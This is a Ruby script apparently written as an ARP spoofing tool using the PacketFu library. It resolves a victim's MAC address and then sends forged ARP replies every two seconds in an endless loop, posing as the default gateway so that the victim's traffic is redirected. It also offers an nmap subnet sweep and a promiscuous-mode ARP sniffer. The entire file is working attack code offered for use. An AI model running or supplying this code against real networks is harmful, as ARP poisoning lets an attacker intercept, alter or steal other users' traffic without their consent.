require 'packetfu'

@args = ARGV.to_a.join(' ').split(' ')

#command line arguments
@interface = @args.include?('-i')? @args[@args.find_index('-i') + 1] : nil
@victim_mac_addr = nil #@args[@args.find_index('-vM') + 1]
@victim_ip_addr =  @args.include?('-vI') ? @args[@args.find_index('-vI') + 1] : nil
@default_gateway = @args[@args.find_index('-g') +1]
@net_info = PacketFu::Utils.whoami?( :iface => @interface)


# finds the mac address of the victim
def get_related_mac
    unless @victim_mac_addr = PacketFu::Utils.arp(@victim_ip_addr, :flavor => 'windows', :iface => @interface, :eth_saddr => @net_info[:eth_saddr] )
      raise "could not resolve the ip related mac address"
    else
      return @victim_mac_addr
    end
end

# use nmap to scan the whole subnet to find ip's and macs
def scan_network
  exec 'nmap -sP ' + @default_gateway + '/24'
end

def spoof
# ethernet header
  victim_arp = PacketFu::ARPPacket.new
  victim_arp.eth_daddr = get_related_mac
  victim_arp.eth_saddr = @net_info[:eth_saddr]

# payload
  victim_arp.arp_opcode = 2   #response   {change it to 1 if you need a request}
  victim_arp.arp_daddr_ip = @victim_ip_addr
  victim_arp.arp_saddr_ip = @default_gateway
  victim_arp.arp_saddr_mac = @net_info[:eth_saddr]
  victim_arp.arp_daddr_mac = @victim_mac_addr

  while true
    sleep 2
    puts "[+] sneding arp packet to victim #{victim_arp.arp_daddr_ip}"
    victim_arp.to_w(@net_info[:iface])
  end
end

@net_packets = Queue.new
def listen
  Thread.new {
    cap = PacketFu::Capture.new :iface => @interface, :start => true, :promisc => true, :filter => 'arp'
    cap.stream.each do |p|
      @net_packets << PacketFu::Packet.parse(p)
    end
  }
  while true
    puts @net_packets.pop.peek
  end
end


if @args.include?('-s')
  scan_network
elsif @args.include?('-l')
  listen
else
  spoof
end
